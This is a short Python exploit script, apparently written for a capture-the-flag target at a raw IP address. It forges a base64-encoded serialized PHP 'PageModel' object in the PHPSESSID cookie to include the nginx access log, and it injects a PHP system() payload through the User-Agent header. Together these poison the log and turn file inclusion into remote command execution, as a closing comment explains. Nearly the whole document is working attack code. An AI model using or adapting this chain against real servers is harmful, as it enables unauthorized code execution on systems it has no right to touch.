import requests
import base64


payload = "/var/log/nginx/access.log"
cookie = 'O:9:"PageModel":1:{s:4:"file";s:'+str(len(payload))+':"' +payload+'";}'
cookie = base64.b64encode(cookie.encode('utf-8')).decode()
cmd = "ls"
phpPayload = f"<?php system('{cmd}')?>"
x = requests.get("http://142.93.32.153:30069/",cookies={"PHPSESSID":f'{cookie}'},headers={"User-Agent": f'{phpPayload}'})
print(x.text)

#poison the ngnix log file with a php payload then use lfi to view the file with the cmd result
